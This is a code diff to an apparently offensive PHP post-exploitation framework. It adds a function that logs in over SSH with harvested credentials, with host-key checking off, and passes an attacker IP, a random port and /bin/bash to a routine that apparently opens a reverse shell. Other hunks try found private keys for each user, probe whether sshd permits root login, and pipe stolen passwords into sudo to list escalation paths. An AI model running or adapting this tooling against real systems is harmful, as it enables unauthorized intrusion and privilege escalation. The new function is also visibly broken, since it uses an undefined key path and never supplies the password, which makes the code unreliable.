@@ -224,9 +224,23 @@ lxc launch SomeAlias MyMachine
         }
     }
     
-
     
-    public function misc2keys4user($username,$remote_privkey_path,$ssh_port){
+    public function misc2user8pass($username,$userpass,$ssh_port){
+        $this->ssTitre(__FUNCTION__);
+        $username = trim($username);
+        $userpass = trim($userpass);
+        $ssh_port = trim($ssh_port);
+        
+        $template_id_euid = "sshpass ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        $attacker_port = rand(1024,65535);
+        $shell = "/bin/bash";
+        $this->lan2pentest8id($template_id_euid, $attacker_ip, $attacker_port, $shell);
+        //===============================================================
+    }
+    
+    
+    public function misc2user8key($username,$remote_privkey_path,$ssh_port){
         $this->ssTitre(__FUNCTION__);
         $username = trim($username);
         $remote_privkey_path = trim($remote_privkey_path);
@@ -296,7 +310,7 @@ lxc launch SomeAlias MyMachine
         
         $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
         $check_root_acces = trim($this->lan2stream4result($data,$this->stream_timeout));
-        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->rouge("Yes Root Access is Permited");
+        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
         if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
         
         
@@ -321,7 +335,7 @@ lxc launch SomeAlias MyMachine
             foreach ($tab_privkeys as $remote_privkey_path){
                 $remote_privkey_path = trim($remote_privkey_path);
                 foreach ($this->tab_users_shell as $username)
-                    if (!empty($username)) $this->misc2keys4user($username, $remote_privkey_path, $ssh_port);
+                    if (!empty($username)) $this->misc2user8key($username, $remote_privkey_path, $ssh_port);
             }
 
         }
@@ -774,13 +788,14 @@ Can be used to determine where other interesting files might be located");
     public function users(){
         $this->titre(__FUNCTION__);
         $users_passwd = $this->ip2users4passwd();
+        $tab_users_shell = $this->ip2users4shell();
         foreach ($users_passwd as $user2name => $user2pass){
             if (!empty($user2name))
                 if (!$this->ip2root8db($this->ip2id)) {
                     $this->users4root($user2name,$user2pass);
                     $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
                     
-                    foreach ($this->tab_users_shell as $user2name_shell)
+                    foreach ($tab_users_shell as $user2name_shell)
                         if (!$this->ip2root8db($this->ip2id)) {
                             $this->users4root($user2name_shell,$user2pass);
                             $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
@@ -798,7 +813,7 @@ Can be used to determine where other interesting files might be located");
     public function users2sudoers2list($user_name,$user_pass){
         $this->titre("Linux Privilege Escalation using Sudo Rights");
         $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
-        $data = "echo '$user_pass' | sudo -S -l ";
+        $data = "echo '$user_pass' | sudo -l -S -U $user_name";
         return $this->lan2stream4result($data,$this->stream_timeout*3);
     }
     
